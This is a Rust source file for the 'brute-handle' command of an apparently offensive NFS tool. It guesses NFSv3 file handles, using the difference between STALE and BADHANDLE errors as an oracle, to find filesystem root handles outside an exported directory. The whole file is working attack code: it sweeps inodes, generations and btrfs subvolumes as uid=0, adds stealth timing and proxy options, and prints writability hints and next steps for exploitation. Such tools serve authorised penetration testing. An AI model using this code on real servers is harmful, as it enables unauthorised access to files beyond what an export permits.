//! NFS file-handle brute force using the STALE/BADHANDLE oracle.
//!
//! NFSv3's error semantics distinguish two failure modes for an unknown
//! handle (RFC 1813 S2.6): NFS3ERR_STALE means the format is correct but
//! the inode/generation pair is wrong, while NFS3ERR_BADHANDLE means the
//! format itself is unrecognised. That distinction is an oracle: feed
//! candidate handles, count STALE responses, and you have positive
//! confirmation that the handle layout is right -- the search reduces to
//! sweeping the inode/generation space.
//!
//! The seed handle carries the filesystem ID and handle format. It is taken
//! from the target's `:/export` via MOUNT when present, or supplied directly
//! with `--seed-handle HEX`. Candidates are generated the same way `escape`
//! does -- fingerprint-driven known roots first, then a sweep -- and a hit is
//! accepted on NFS3_OK *or* NFS3ERR_ACCES (a squashed root is still a valid
//! handle).
//!
//! This is a read-only discovery tool: it never writes to the server. A
//! handle is not itself read-write or read-only -- writability is a property
//! of the export's ro/rw flag and the credential used, not the handle. For
//! each hit we report a *non-destructive* writability hint from the advisory
//! ACCESS bitmask (RFC 1813 S3.3.4), probed as uid=0 and as the owner. The
//! authoritative test is to actually write via `shell`/`mount`.

use anyhow::{Context as _, bail};
use clap::Parser;
use nfs3_types::nfs3::{ACCESS3args, GETATTR3args, Nfs3Result, ftype3, nfsstat3};

use crate::cli::probe::{make_client, make_mount_client, parse_addr_with_port};
use crate::cli::target::{self, Source};
use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, FsType};
use crate::proto::auth::{AuthSys, Credential};
use crate::proto::nfs3::client::Nfs3Client;
use crate::proto::nfs3::types::{FileHandle, access};
use crate::util::stealth::StealthConfig;

/// Brute-force NFS file handles.
///
/// Derives a seed handle (filesystem ID + format) by mounting the target
/// export, or from an explicit `--seed-handle`, then generates candidate
/// handles -- fingerprint-driven known roots first, then an inode/generation
/// sweep -- and reports the first valid root. A hit is accepted on NFS3_OK or
/// NFS3ERR_ACCES (a squashed root is still a valid handle), matching `escape`.
///
/// Read-only: never writes to the server. Each hit carries a non-destructive
/// writability hint from advisory ACCESS bits (the export's ro/rw flag and the
/// credential determine writability, not the handle).
///
/// Examples:
///   nfswolf brute-handle 192.168.1.10:/srv
///   nfswolf brute-handle 192.168.1.10 --seed-handle 01000200... --fs-type xfs
#[derive(Parser)]
pub struct BruteHandleArgs {
    /// Target host with optional :/export (e.g. 10.0.0.5:/srv).
    /// The export is mounted to derive the seed handle when --seed-handle is omitted.
    #[arg(help_heading = H_TARGET, value_name = "TARGET")]
    pub target: String,

    /// Export path (alternative to host:/export); mounted to derive the seed handle.
    #[arg(short = 'e', long, value_name = "PATH", help_heading = H_TARGET)]
    pub export: Option<String>,

    /// Seed handle (hex) from a prior mount or escape. Optional: when omitted,
    /// the seed is derived by mounting the target export. Provides fsid + format.
    #[arg(long, value_name = "HEX", help_heading = H_TARGET)]
    pub seed_handle: Option<String>,

    /// Filesystem type to guide candidate generation: auto (default), ext4, xfs, btrfs.
    /// `auto` fingerprints the seed handle.
    #[arg(long, default_value = "auto", value_name = "TYPE", help_heading = H_BEHAVIOR)]
    pub fs_type: String,

    /// Maximum number of handles to probe.
    #[arg(long, default_value = "10000", value_name = "N", help_heading = H_BEHAVIOR)]
    pub max_attempts: u64,

    /// Fix inode to this value and sweep generations instead of sweeping inodes.
    /// Use when the STALE oracle confirms the inode exists but the generation is unknown.
    #[arg(long, value_name = "INODE", help_heading = H_BEHAVIOR)]
    pub fixed_inode: Option<u32>,

    /// Generation range start (used with --fixed-inode).
    #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
    pub gen_start: u32,

    /// Generation range end (used with --fixed-inode; 0 = use max_attempts from gen_start).
    #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
    pub gen_end: u32,
}

/// Run the brute-handle command.
pub async fn run(args: BruteHandleArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
    // Reuse the shared target parser: `host:/export` derives a seed via MOUNT,
    // `--seed-handle HEX` is an explicit override (passed as the handle source,
    // so the parser's colon-vs-handle conflict rules apply for free).
    let target = target::parse(&args.target, args.export.as_deref(), args.seed_handle.as_deref(), false)?;
    let host = target.host.to_string();
    let addr = parse_addr_with_port(&host, globals.nfs_port)?;
    let stealth = StealthConfig::new(globals.delay, globals.jitter);

    // Derive the seed handle (fsid + format) and the export used for the PoolKey.
    let (seed, pool_export) = match &target.source {
        Source::Handle(hex) => (FileHandle::from_hex(hex).context("invalid --seed-handle / --handle")?, "/".to_owned()),
        Source::Export(path) => {
            let mnt = make_mount_client(globals).mount(addr, path).await.with_context(|| format!("MNT {path}"))?;
            (mnt.handle, path.clone())
        },
        Source::None => bail!("no seed handle: pass <HOST>:/export (mounted to derive a seed) or --seed-handle HEX"),
    };

    // uid=0 for probes so permission errors (squashed root) are distinguishable
    // from format errors (STALE/BADHANDLE). Handles are bearer tokens.
    let (_, _, client) = make_client(addr, &pool_export, 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port);

    let fs = resolve_fs_type(&args.fs_type, &seed);
    let mode = args.fixed_inode.map_or_else(|| format!("inode-sweep {fs:?}"), |i| format!("inode={i} gen-sweep"));
    eprintln!("{}", crate::output::status_info(&format!("Brute-forcing handles on {host} [{mode}] (max {})", args.max_attempts)));

    let found = if let Some(inode) = args.fixed_inode {
        sweep_generations(&client, &seed, GenSweep { inode, gen_start: args.gen_start, gen_end: args.gen_end, max_attempts: args.max_attempts }, &host).await
    } else if matches!(fs, FsType::Btrfs) {
        sweep_btrfs(&client, &seed, args.max_attempts, &host).await
    } else {
        sweep_inodes(&client, &seed, fs, args.max_attempts, &host).await
    };

    if !found {
        eprintln!("{}", crate::output::status_warn("No valid root found. If candidates returned STALE, try --fixed-inode 2 --gen-start 0 (sweep the root's generation), or pass --fs-type explicitly."));
    }
    crate::cli::emit_replay(globals);
    Ok(())
}

/// Resolve the filesystem type from the explicit flag, or fingerprint the seed.
fn resolve_fs_type(flag: &str, seed: &FileHandle) -> FsType {
    match flag {
        "ext4" => FsType::Ext4,
        "xfs" => FsType::Xfs,
        "btrfs" => FsType::Btrfs,
        _ => FileHandleAnalyzer::fingerprint_fs(seed),
    }
}

/// Outcome of probing one candidate handle with GETATTR.
enum Probe {
    /// Handle resolves to a directory (the filesystem root we want).
    Dir,
    /// Handle resolves to a non-directory object (valid inode, not a root).
    NonDir,
    /// Handle format accepted but access denied (squashed root) -- still a hit.
    Denied,
    /// Correct format, wrong inode/generation (the oracle).
    Stale,
    /// Wrong format or other rejection.
    Miss,
}

/// Probe a candidate handle with GETATTR (as uid=0) and classify the result.
async fn probe(client: &Nfs3Client, fh: &FileHandle) -> Probe {
    let args = GETATTR3args { object: fh.to_nfs_fh3() };
    match client.getattr(&args).await {
        Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == ftype3::NF3DIR => Probe::Dir,
        Ok(Nfs3Result::Ok(_)) => Probe::NonDir,
        Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => Probe::Denied,
        Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _))) => Probe::Stale,
        _ => Probe::Miss,
    }
}

/// Non-destructive writability hint for a discovered handle.
///
/// Writability is a property of the export (ro/rw) and the credential, not the
/// handle. This never writes: it reads the advisory ACCESS bitmask
/// (RFC 1813 S3.3.4) as uid=0 and, if that grants nothing, as the object's
/// owner -- so a root_squash'd rw export still shows as writable. Advisory only;
/// confirm by actually writing via `shell`/`mount`.
async fn writability_hint(client: &Nfs3Client, fh: &FileHandle) -> String {
    if access_grants_write(client, fh).await {
        return "writable as uid=0 (advisory; rw export, root not squashed)".to_owned();
    }
    // Retry the advisory check as the object's owner: catches a rw export where
    // root is squashed but the owning UID can still write.
    if let Ok(Nfs3Result::Ok(ga)) = client.getattr(&GETATTR3args { object: fh.to_nfs_fh3() }).await {
        let (ouid, ogid) = (ga.obj_attributes.uid, ga.obj_attributes.gid);
        if ouid != 0 {
            let owner = client.with_credential(Credential::Sys(AuthSys::with_groups(ouid, ogid, &[ogid], "nfswolf")), ouid, ogid);
            if access_grants_write(&owner, fh).await {
                return format!("writable as owner uid={ouid} (advisory)");
            }
        }
    }
    "read-only (advisory: no write bits for uid=0 or owner; ro export or restrictive perms)".to_owned()
}

/// Whether the client's credential is granted any write bit on the handle (advisory).
async fn access_grants_write(client: &Nfs3Client, fh: &FileHandle) -> bool {
    matches!(client.access(&ACCESS3args { object: fh.to_nfs_fh3(), access: access::ALL }).await, Ok(Nfs3Result::Ok(ok)) if access::grants_write(ok.access))
}

/// Print a found handle with its (non-destructive) writability hint and next steps.
async fn report_hit(client: &Nfs3Client, candidate: &EscapeResult, note: &str, host: &str) {
    let rw = writability_hint(client, &candidate.root_handle).await;
    let hex = candidate.root_handle.to_hex();
    println!();
    println!("  Filesystem:  {:?}  (inode {}  {note})", candidate.fs_type, candidate.inode_number);
    println!("  Writability: {rw}");
    crate::output::print_handle("Root handle", &hex);
    crate::output::print_handle_next_steps(&hex, host);
    println!();
}

/// Inode sweep: fingerprint-driven known roots first (parity with `escape`),
/// then a generic inode sweep. Returns true once a root is found.
async fn sweep_inodes(client: &Nfs3Client, seed: &FileHandle, fs: FsType, max_attempts: u64, host: &str) -> bool {
    // Phase 1: the same candidates escape tries (ext4 inode 2 / compound UUID,
    // plus XFS 128/64/32 when the type is XFS or ambiguous).
    let mut known: Vec<EscapeResult> = FileHandleAnalyzer::construct_escape_handle(seed).into_iter().collect();
    if matches!(fs, FsType::Xfs | FsType::Unknown) {
        known.extend(FileHandleAnalyzer::construct_xfs_escape_candidates(seed));
    }
    let mut stale = 0u64;
    for cand in &known {
        match probe(client, &cand.root_handle).await {
            Probe::Dir => {
                report_hit(client, cand, "known root, verified", host).await;
                return true;
            },
            Probe::Denied => {
                report_hit(client, cand, "known root, access denied (root_squash)", host).await;
                return true;
            },
            Probe::NonDir => tracing::debug!(inode = cand.inode_number, "known candidate hit a non-directory"),
            Probe::Stale => stale += 1,
            Probe::Miss => {},
        }
    }

    // Phase 2: generic inode sweep from the fs-appropriate start inode, gen=0.
    let start = if matches!(fs, FsType::Xfs) { 64u64 } else { 2u64 };
    let mut tried = 0u64;
    for inode in start..start.saturating_add(max_attempts) {
        if tried >= max_attempts {
            break;
        }
        let inode32 = u32::try_from(inode).unwrap_or(u32::MAX);
        let Some(cand) = FileHandleAnalyzer::construct_handle_for_inode(seed, inode32, 0) else {
            continue;
        };
        tried += 1;
        match probe(client, &cand.root_handle).await {
            Probe::Dir => {
                report_hit(client, &cand, "found via scan", host).await;
                return true;
            },
            Probe::Denied => {
                report_hit(client, &cand, "found via scan (ACCES -- root_squash active)", host).await;
                return true;
            },
            Probe::NonDir => tracing::debug!(inode, "scan hit a non-directory inode (within export subtree)"),
            Probe::Stale => stale += 1,
            Probe::Miss => {},
        }
    }
    eprintln!("{}", crate::output::status_info(&format!("Swept {tried} inodes, {stale} STALE (format match, wrong inode/gen)")));
    false
}

/// Parameters for a fixed-inode generation sweep (grouped to keep the arg count sane).
struct GenSweep {
    inode: u32,
    gen_start: u32,
    gen_end: u32,
    max_attempts: u64,
}

/// Generation sweep for a fixed inode -- brute-handle's unique capability over
/// `escape`, which only ever tries gen=0.
async fn sweep_generations(client: &Nfs3Client, seed: &FileHandle, s: GenSweep, host: &str) -> bool {
    let end = if s.gen_end > s.gen_start { s.gen_end } else { u32::try_from(u64::from(s.gen_start).saturating_add(s.max_attempts).min(u64::from(u32::MAX))).unwrap_or(u32::MAX) };
    eprintln!("{}", crate::output::status_info(&format!("Sweeping gen {}..={end} for inode {}", s.gen_start, s.inode)));

    let mut tried = 0u64;
    let mut stale = 0u64;
    let mut g = s.gen_start;
    while g <= end && tried < s.max_attempts {
        if let Some(cand) = FileHandleAnalyzer::construct_handle_for_inode(seed, s.inode, g) {
            tried += 1;
            match probe(client, &cand.root_handle).await {
                Probe::Dir => {
                    report_hit(client, &cand, &format!("inode {} gen {g}", s.inode), host).await;
                    return true;
                },
                Probe::Denied => {
                    report_hit(client, &cand, &format!("inode {} gen {g} (ACCES)", s.inode), host).await;
                    return true;
                },
                Probe::NonDir => {
                    report_hit(client, &cand, &format!("inode {} gen {g} (non-directory)", s.inode), host).await;
                    return true;
                },
                Probe::Stale => stale += 1,
                Probe::Miss => {},
            }
        }
        g = g.saturating_add(1);
    }
    eprintln!("{}", crate::output::status_info(&format!("Swept {tried} generations, {stale} STALE")));
    false
}

/// BTRFS subvolume sweep (subvol IDs 5 and 256+).
async fn sweep_btrfs(client: &Nfs3Client, seed: &FileHandle, max_attempts: u64, host: &str) -> bool {
    let max = u32::try_from(max_attempts.min(u64::from(u32::MAX))).unwrap_or(u32::MAX);
    let candidates = FileHandleAnalyzer::construct_btrfs_subvol_handles(seed, max);
    let mut tried = 0u64;
    let mut stale = 0u64;
    for cand in &candidates {
        if tried >= max_attempts {
            break;
        }
        tried += 1;
        match probe(client, &cand.root_handle).await {
            Probe::Dir => {
                report_hit(client, cand, &format!("BTRFS subvol {}", cand.inode_number), host).await;
                return true;
            },
            Probe::Denied => {
                report_hit(client, cand, &format!("BTRFS subvol {} (ACCES)", cand.inode_number), host).await;
                return true;
            },
            Probe::NonDir => tracing::debug!(subvol = cand.inode_number, "btrfs subvol hit a non-directory"),
            Probe::Stale => stale += 1,
            Probe::Miss => {},
        }
    }
    eprintln!("{}", crate::output::status_info(&format!("Tried {tried} BTRFS subvols, {stale} STALE")));
    false
}
